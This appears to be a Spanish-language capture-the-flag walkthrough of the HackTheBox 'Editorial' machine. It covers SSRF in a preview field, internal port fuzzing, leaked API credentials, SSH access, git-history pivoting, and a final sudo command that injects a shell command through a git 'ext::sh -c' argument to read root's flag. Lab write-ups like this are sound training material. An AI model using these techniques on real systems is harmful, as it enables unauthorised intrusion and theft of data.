#Linux #Easy #fuzzing 

### Ping

```python
ping -c 1 10.10.11.20
PING 10.10.11.20 (10.10.11.20) 56(84) bytes of data.
64 bytes from 10.10.11.20: icmp_seq=1 ttl=63 time=153 ms

--- 10.10.11.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 153.031/153.031/153.031/0.000 ms
```

### TTL 63 = Linux

### nmap

```python
# Nmap 7.94SVN scan initiated Sat Jun 15 15:36:17 2024 as: nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -oN Scan 10.10.11.20
Nmap scan report for 10.10.11.20
Host is up (0.15s latency).
Not shown: 64695 closed tcp ports (reset), 838 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 15 15:36:45 2024 -- 1 IP address (1 host up) scanned in 28.66 seconds
```

### Enumeración del puerto 80 (http)
tenemos una web donde podemos obtener información de varios parámetros. en este caso el parámetro interesante es el del botón de `Preview`
![[Pasted image 20240616140746.png]]

### BurpSuite
llenamos los campos y subimos un archivo malicioso. interceptamos la petición con busquita y la enviamos al repeater para enviarla. obtenemos una ruta de `uploads` 
![[Pasted image 20240615182300.png]]

### Servidor
obtenemos una solicitud de estado 200 lo que quiere decir que es correcta

![[Pasted image 20240616144920.png]]

`uploads`
miramos el `endpoint` que obtuvimos pero no podemos ver nada en el uploads lo que me hace pensar que es una petición interna
![[Pasted image 20240616144515.png]]

### SSRF
Un **Server-side Request Forgery (SSRF)** ocurre cuando un atacante manipula una aplicación **del lado del servidor** para realizar **solicitudes HTTP** a un dominio de su elección. Esta vulnerabilidad expone al servidor a solicitudes externas arbitrarias dirigidas por el atacante.

### Petición
vamos a realizar la petición nuevamente pero apuntando al local host 
![[Pasted image 20240616145730.png]]

### Burpsuite
guardaremos esta petición en un archivo llamado req.txt
![[Pasted image 20240616145842.png]]

### Fuzzing con ffuf
agregamos la palabra `PORT` después de la URL para indicarle a ffuf el parámetro en donde queremos hacer el Fuzzing 
![[Pasted image 20240616150216.png]]

`ffuf`
logramos encontrar el puerto 5000 abierto internamente en la maquina así que vamos a apuntar hacia el
![[Pasted image 20240616145959.png]]

### Burpsuite
hacemos una nueva petición y la interceptamos pero esta vez apuntando al `http://127.0.0.1:5000` esto nos regresa una ruta asi que vamos hacer un `curl` para saber que es esto
![[Pasted image 20240616150554.png]]

`curl`
tenemos varios `endpoint` debemos mirar en todos hasta conseguir algo interesante 
![[Pasted image 20240616143849.png]]

`author`
este `endpoint` contiene credenciales sobre un usuario. 
![[Pasted image 20240616144144.png]]

### ssh
conseguimos acceso a la maquina vía ssh
![[Pasted image 20240616151233.png]]

### Escalada de privilegios
tenemos in `.git` parece que todo es un repositorio. debemos investigarlo
![[Pasted image 20240616162402.png]]

`logs`
en esta parte vemos un par de commits que se han generado así que podemos leerlos para ver los cambios
![[Pasted image 20240616165138.png]]

`git show`
con este comando podemos pasar el git 
![[Pasted image 20240616165916.png]]

### User Pivoting
hemos conseguido movernos lateralmente al usuario `prod`
`NOTA`: el usuario prod tiene permisos para ejecutar el script `clone_prod_change_py` este script es vulnerable a una ejecución arbitraria de comando por lo que nos aprovechamos para leer la flag

```python
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt"
```

![[Pasted image 20240616170350.png]]

